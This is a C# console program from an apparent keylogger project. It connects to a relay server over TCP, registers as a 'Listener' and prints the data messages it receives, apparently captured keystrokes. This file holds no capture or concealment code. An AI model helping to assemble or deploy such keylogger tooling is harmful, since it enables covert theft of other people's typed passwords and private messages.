using System;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace KeyLogger.ConsoleListener
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine($"Usage: dotnet run KeyLogger.ConsoleListener.dll <hostname|ip>[:<port>]");
                return;
            }

            var split = args[0].Split(':');
            if (split.Length < 1)
            {
                Console.WriteLine($"Usage: dotnet run KeyLogger.ConsoleListener.dll <hostname|ip>:<port>");
                return;
            }
            
            int port = 10000;
            if (split.Length >= 2)
            {
                try
                {
                    port = int.Parse(split[1]);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Invalid port: " + e.Message);
                    return;
                }
            }

            var endPoint = new DnsEndPoint(split[0], port);
            
            TcpClient client = null;
            try
            {
                client = new TcpClient(endPoint.Host, endPoint.Port);
                Console.WriteLine("Connected");
            }
            catch (SocketException e)
            {
                Console.WriteLine($"Can't connect to socket: {e.Message}");
                return;
            }
            catch (ArgumentOutOfRangeException)
            {
                Console.WriteLine($"The port best be between {IPEndPoint.MinPort} and {IPEndPoint.MaxPort}");
                return;
            }

            try
            {
                var stream = client.GetStream();
                new ConnectionMessage(ClientType.Listener).Send(stream);

                while (client.Connected)
                {
                    var message = new DataMessage();
                    message.Receive(stream);
                    Console.WriteLine(message);
                }

                Console.WriteLine("Disconnected");
            }
            catch (InvalidDataException)
            {
                Console.WriteLine("Invalid data received");
                return;
            }
            catch (IOException)
            {
                Console.WriteLine("Connection lost");
                return;
            }
        }
    }
}
